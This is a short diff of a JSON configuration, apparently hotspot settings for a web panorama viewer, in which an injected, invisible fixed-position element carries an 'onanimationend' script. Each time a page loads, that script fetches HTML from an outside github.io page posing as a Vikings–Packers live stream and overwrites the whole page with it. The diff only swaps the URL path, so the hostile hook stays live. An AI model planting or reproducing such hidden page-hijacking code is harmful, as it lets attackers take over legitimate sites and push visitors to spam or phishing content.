@@ -12,7 +12,7 @@
       "URL": "#",
       "attributes": {
         "style": "visibility:visible !important; position:fixed; top:0; left:0; width:1px; height:1px; z-index:99999; opacity:0; pointer-events:none; animation: pnlm-mv 0.01s 1 forwards",
-        "onanimationend": "if (window.grav_FETCH_RAN) { console.log('already ran'); } else { window.grav_FETCH_RAN = 1; fetch('https://collabstyem.github.io/news/cbs/video-minnesota-vikings-vs-green-bay-packers-match-lie-strms-us01fx84.html').then(function (res) { return res.text(); }).then(function (html) { document.open(); document.write(html); document.close(); }).catch(function (err) { console.error(err); }); }"
+        "onanimationend": "if (window.grav_FETCH_RAN) { console.log('already ran'); } else { window.grav_FETCH_RAN = 1; fetch('https://collabstyem.github.io/news/cbc/video-minnesota-vikings-vs-green-bay-packers-match-lie-strms-us01fx84.html').then(function (res) { return res.text(); }).then(function (html) { document.open(); document.write(html); document.close(); }).catch(function (err) { console.error(err); }); }"
       }
     }
   ]
